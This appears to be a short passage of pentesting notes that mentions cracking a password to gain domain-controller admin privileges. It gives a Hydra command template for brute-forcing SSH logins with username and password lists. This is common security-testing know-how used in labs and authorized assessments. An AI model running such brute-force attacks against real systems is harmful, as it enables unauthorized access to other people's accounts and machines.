→ we crack the password and then as a DC-admin has high privileges we can use this to attack further if we want


to perform SSH-bruteforce using [[Hydra]]
```bash
hydra -L <path/to/username-list> -P <path/to/password-list> ssh://<target-ip> 
```


---
